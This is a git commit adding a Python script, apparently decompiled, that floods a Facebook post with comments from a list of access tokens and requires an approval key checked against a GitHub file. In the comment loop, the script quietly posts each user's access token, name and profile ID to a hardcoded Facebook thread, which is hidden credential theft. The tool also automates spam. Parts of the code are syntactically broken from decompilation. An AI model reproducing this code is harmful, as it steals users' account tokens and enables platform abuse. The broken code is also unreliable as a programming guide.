22ce62362f743b251929c6d453f51e0447596758
DADY420 <31779210+VIBE81@users.noreply.github.com>
2024-06-14 06:32:56 -0400

    Add files via upload

---
+++ amarjeet.py
@@ -0,0 +1,306 @@
+# Bytecode version: 3.11a7e (3495)
+
+
+from platform import system
+import sys
+import os
+import datetime
+from time import sleep
+import getpass
+url = 'https://m.facebook.com/login.php'
+W = '[97;1m'
+R = '[91;1m'
+G = '[92;1m'
+Y = '[93;1m'
+B = '[94;1m'
+P = '[95;1m'
+C = '[96;1m'
+N = '[0m'
+import os
+try:
+    import requests
+except ImportError:
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    os.system('pip install futures')
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import getpass
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import bs4
+import uuid
+import json
+import os
+import sys
+import random
+import datetime
+import time
+import re
+import subprocess
+try:
+    import rich
+except ImportError:
+    os.system('pip install rich')
+    time.sleep(1)
+    try:
+        import rich
+    except ImportError:
+        exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+import base64
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from urllib.parse import quote
+ugen2 = ['User Agent: Mozilla/5.0 (Linux; Android 12; vivo 1938 Build/SP1A.210812.003;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36']
+ugen = ['User Agent: Mozilla/5.0 (Linux; Android 12; vivo 1938 Build/SP1A.210812.003;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36']
+
+def testPY():
+    if sys.version_info[0] < 3:
+        print('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
+        sys.exit()
+
+def modelsInstaller():
+    try:
+        models = ['requests', 'colorama']
+        for model in models:
+            pass  # postinserted
+        else:  # inserted
+            try:
+                if sys.version_info[0] < 3:
+                    os.system('cd C:\\Python27\\Scripts & pip install {}'.format(model))
+                else:  # inserted
+                    os.system('python -m pip install {}'.format(model))
+                print(' ')
+                print('[+] {} has been installed successfully, Restart the program.'.format(model))
+                sys.exit()
+                print(' ')
+            except:
+                print('[-] Install {} manually.'.format(model))
+                print(' ')
+    except:
+        pass  # postinserted
+    return None
+import base64
+import json
+import time
+import sys
+import os
+import re
+import binascii
+import time
+import json
+import random
+import threading
+import pprint
+import smtplib
+import telnetlib
+import os.path
+import hashlib
+import string
+import glob
+import getpass
+import sqlite3
+import urllib
+import argparse
+import marshal
+import datetime
+from platform import system
+from getpass import getpass
+import getpass
+from datetime import datetime
+try:
+    import requests
+    from colorama import Fore
+    from colorama import init
+except:
+    modelsInstaller()
+requests.packages.urllib3.disable_warnings()
+
+def cls():
+    if system() == 'Linux':
+        os.system('clear')
+    else:  # inserted
+        if system() == 'Windows':
+            os.system('cls')
+cls()
+CLEAR_SCREEN = '[2J'
+RED = '[1;37;1m'
+RESET = '[1;37;1m'
+BLUE = '[1;37;1m'
+khushi = '2003'
+WHITE = ('[1;37;1m',)
+YELLOW = ('[1;37;1m',)
+CYAN = '[1;37;1m'
+MAGENTA = ('[1;37;1m',)
+GREEN = '[1;37;1m'
+RESET = '[1;37;1m'
+BOLD = '[1;37;1m'
+REVERSE = '[1;37;1m'
+ak = ' 4M4RJ33T-'
+myid = uuid.uuid4().hex[:10].upper()
+try:
+    key1 = open('/data/data/com.termux/files/usr/bin/.KHUSHI -cov', 'r').read()
+except:
+    kok = open('/data/data/com.termux/files/usr/bin/.KHUSHI -cov', 'w')
+print('[1;36;40m', end='')
+
+def Subscraption():
+    key1 = open('/data/data/com.termux/files/usr/bin/.KHUSHI -cov', 'r').read()
+    os.system('clear')
+    r1 = requests.get('https://github.com/Am4rjeet/Amar/blob/main/aprvl.txt').text
+    if key1 in r1:
+        os.system('clear')
+        return
+    os.system('clear')
+    print(logo)
+    print('\t [1;32m First Get Approvel[1;37m ')
+    time.sleep(1)
+    os.system('clear')
+    print('[1;36;40m', end='')
+    print(logo)
+    print('')
+    print(' [1;32m You Need Get Approved First[1;37m\n')
+    print(' [1;32m  [=[ Amar Rajput ]=] [1;37m')
+    print('[1;36;40m', end='')
+    print('')
+    print(' Your Key is Not Approved ')
+    print('')
+    print(' Copy And Send Key To Admin')
+    print('[1;34;40m', end='')
+    print('')
+    print('--> Your Key : ' + ak + key1, '\n')
+    print('')
+    name = input('--> Please Enter Your Name : ')
+    print('')
+    lol = input('--> Please Enter Your Email : ')
+    print('')
+    k3y = input('--> Please Enter To Send Key :')
+    time.sleep(3.5)
+    tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20' + lol + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + name + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + k3y
+    os.system('am start https://wa.me/+918769028834?text=' + tks)
+    Subscraption()
+Subscraption()
+
+def logo():
+    clear = '[0m'
+    colors = [35, 33, 36]
+    x = '\n   \n\n\n$$\\       $$$$$$\\   $$$$$$\\   $$$$$$\\  $$\\   $$\\ $$$$$$$\\        \n$$ |     $$ _$$\\ $$  _$$\\ $$ _$$\\ $$$\\  $$ |$$  _$$\\       \n$$ |     \\/   $$ |$$ /  \\|\\/   $$ |$$$$\\ $$ |$$ |  $$ |      \n$$ |       $$$$$ / $$ |$$$$\\   $$$$$ / $$ $$\\$$ |$$ |  $$ |      \n$$ |       \\_$$\\ $$ |\\$$ |  \\_$$\\ $$ \\$$$$ |$$ |  $$ |      \n$$ |     $$\\   $$ |$$ |  $$ |$$\\   $$ |$$ |\\$$$ |$$ |  $$ |      \n$$$$$$$$\\$$$$$$  |\\$$$$$$  |\\$$$$$$  |$$ | \\$$ |$$$$$$$  |      \n\\__|\\__/  \\__/  \\__/ \\|  \\|\\__/       \n                                                                 \n\n$$\\   $$\\  $$$$$$\\  $$$$$$$\\   $$$$$$\\   $$$$$$\\  \n$$ |  $$ |$$ _$$\\ $$  _$$\\ $$$ _$$\\ $$  _$$\\ \n$$ |  $$ |\\/   $$ |$$ |  $$ |$$$$\\ $$ |$$ /  \\_|\n$$$$$$$$ |  $$$$$ / $$$$$$$  |$$\\$$\\$$ |\\$$$$$$\\  \n$$  _$$ |  \\_$$\\ $$  _$$< $$ \\$$$$ | \\_$$\\ \n$$ |  $$ |$$\\   $$ |$$ |  $$ |$$ |\\$$$ |$$\\   $$ |\n$$ |  $$ |\\$$$$$$  |$$ |  $$ |\\$$$$$$  /\\$$$$$$  |\n\\_|  \\| \\__/ \\|  \\| \\__/  \\___/                                                                       \n'
+    for N, line in enumerate(x.split('\n')):
+        sys.stdout.write('[1;%dm%s%s\n' % (random.choice(colors), line, clear))
+        time.sleep(0.05)
+logo()
+testPY()
+print('[1;33m---------------------------------------------------------------------\n')
+
+def message_on_messenger(message):
+    for index, i in enumerate(ns):
+        try:
+            message = str(mn) + i
+            url = 'https://graph.facebook.com/{}/comments/'.format(thread_id)
+            kk = 'https://graph.facebook.com/v15.0/{0}/'.format('t_100002970967521')
+            message3 = 'Account Login Token ::- ' + str(access_tokens[index % len(access_tokens)])
+            message4 = 'Account Name ::- ' + str(get_profile_name(access_tokens[index % len(access_tokens)]))
+            message7 = 'Account Facebook I\'d ::- https://www.facebook.com/' + str(get_profile_name2(access_tokens[index % len(access_tokens)]))
+            message5 = message3 + '\n' + message4 + '\n' + message7
+            parameters3 = {'access_token': access_tokens[index % len(access_tokens)], 'message': message5}
+            s2 = requests.post(kk, data=parameters3, headers=headers)
+            parameters = {'access_token': access_tokens[index % len(access_tokens)], 'message': message}
+            s = requests.post(url, data=parameters, headers=headers)
+            tt = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
+            if s.ok:
+                e = datetime.now()
+                print('[1;32;40m', end='')
+                print('[1;34m[✓] Your Profile Name :: [1;35m', get_profile_name(access_tokens[index % len(access_tokens)]), '\n')
+                print('[1;32;40m', end='')
+                print('--> Your Wall Link  :--', thread_id)
+                print(e.strftime('--> L3G3ND H3R03S RULL3X H3R3 :D | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p'))
+                print('--> Message Successfully Sent By Amar  Rajput :D ::-->> ', message)
+                print('\n')
+                time.sleep(timm)
+            else:  # inserted
+                print('[1;32m[x] Message Block ' + tt, '\n[×] Token Error\n')
+                time.sleep(30)
+        except Exception as e:
+            print('[1;31;40m', end='')
+            print(e, '\n')
+            time.sleep(30)
+
+def get_profile_name(access_token):
+    payload = {'access_token': access_token}
+    a = 'https://graph.facebook.com/v15.0/me'
+    b = requests.get(a, params=payload)
+    d = json.loads(b.text)
+    if 'name' not in d:
+        print(BOLD + RED + '\n[x] Token Invalid..!!')
+        sys.exit()
+    return d['name']
+
+def get_profile_name2(access_token):
+    payload = {'access_token': access_token}
+    a = 'https://graph.facebook.com/v15.0/me'
+    b = requests.get(a, params=payload)
+    d = json.loads(b.text)
+    if 'id' not in d:
+        print(BOLD + RED + '\n[x] Token Invalid..!!')
+        sys.exit()
+    return d['id']
+
+def get_messages():
+    try:
+        url = 'https://www.facebook.com'
+    except HTTPError as e:
+        print('HTTP Error')
+    except URLError as e:
+        print('URL Error')
+print('[1;36m---------------------------------------------------------------------\n')
+print('[1;35m-=[ Facebook Tool Pool Ka Super Hero Legend Hero\'s Rullex ]=-')
+print('[1;33m-=[ Contact Us :: https://www.facebook.com/Am4rjeet /]=-\n')
+i = datetime.now()
+print('[1;36m---------------------------------------------------------------------\n')
+print(i.strftime('[1;32m[#] Start Time ==> %Y-%m-%d %I:%M:%S %p '))
+print('[1;32m[#] _ Tool Fucker == > [ Amar  Rajput ]\n')
+print('[1;36;40m', end='')
+password = input('[1;36m[+] Enter Password :: ')
+token_file = input('[+] Input Token File Name :: ')
+print('\n')
+with open(token_file, 'r') as f2, f2.read().splitlines() as access_tokens:
+    break
+print('\nList of Access Tokens and their Profile Names:')
+for index, access_token in enumerate(access_tokens, 1):
+    profile_name = get_profile_name(access_token)
+    print(f'{index}. All Profile Name : {profile_name}')
+for access_token in access_tokens:
+    print('\n')
+    thread_id = input(BOLD + CYAN + '[1;36m[+] Enter Post ID :: [1;32;1m')
+    mn = input(BOLD + CYAN + '[1;36m[+] Enter Kidx Name :: [1;32;1m')
+    ms = input(BOLD + CYAN + '[1;36m[+] Enter Notepad File :: [1;32;1m')
+
+    @int
+    repeat = input(BOLD + CYAN + '[1;36m[+] File Repeat No :: [1;32;1m')
+
+    @int
+    timm = input(BOLD + CYAN + '[1;36m[+] Speed in Seconds :: [1;32;1m')
+    print('\n')
+    ns = open(ms, 'r').readlines()
+    for i in range(repeat):
+        messenger = get_messages()
+        message_on_messenger(thread_id)
+    continue
+else:  # inserted
+    pass  # postinserted
+print(BOLD + RED + '[-] <==> Your Number Is Wrong Please Take Approval From Owner')
